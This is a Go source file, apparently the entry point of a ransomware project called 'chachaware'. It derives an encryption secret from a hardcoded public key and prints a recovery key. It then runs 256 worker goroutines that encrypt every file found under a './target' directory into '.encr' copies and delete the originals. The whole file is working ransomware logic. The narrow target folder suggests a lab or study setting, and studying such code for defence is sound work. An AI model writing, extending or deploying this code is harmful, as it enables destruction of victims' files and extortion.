package main

import (
	crypto2 "chachaware/internal/crypto"
	"chachaware/internal/model/scanner"
	"encoding/base64"
	"fmt"
	"os"
	"sync"
)

func main() {
	// Generate new secret and recovery key
	storedPub, _ := base64.RawURLEncoding.DecodeString("I7rHqA5jmDlZWJ1E8zM8lDXRNSeJ678BnPMn4luIMTU")
	secret, recovery, err := crypto2.GenerateSecret(storedPub)
	if err != nil {
		panic(err)
	}
	fmt.Println("recovery key: " + base64.RawURLEncoding.EncodeToString(recovery))

	// Start workers and enqueue files
	wp := newWorkerPool(secret, 256)
	for _, s := range getScanners(wp) {
		s.Run()
	}

	// Wait until workers are finished
	close(wp.files)
	wp.wg.Wait()
}

func getScanners(w workerPool) []scanner.Scanner {
	// Configuration of targeted directories and extensions
	return []scanner.Scanner{
		{
			Dir:    "./target",
			Action: w.enqueueFile,
		},
	}
}

type workerPool struct {
	secret []byte

	files chan string
	wg    *sync.WaitGroup
}

func newWorkerPool(secret []byte, workersCount int) (s workerPool) {
	s.secret = secret
	s.files = make(chan string)
	s.wg = &sync.WaitGroup{}
	s.wg.Add(workersCount)

	// Start workers
	for i := 0; i < workersCount; i++ {
		go s.worker()
	}
	return
}

func (w workerPool) enqueueFile(path string) {
	w.files <- path
}

func (w workerPool) worker() {
	defer w.wg.Done()
	for path := range w.files {
		in, err := os.Open(path)
		out, err2 := os.Create(path + ".encr")

		// Encrypt and delete target file
		if err == nil && err2 == nil {
			if err = crypto2.Encrypt(w.secret, in, out); err == nil {
				os.Remove(path)
			}
		}

		in.Close()
		out.Close()
	}
}
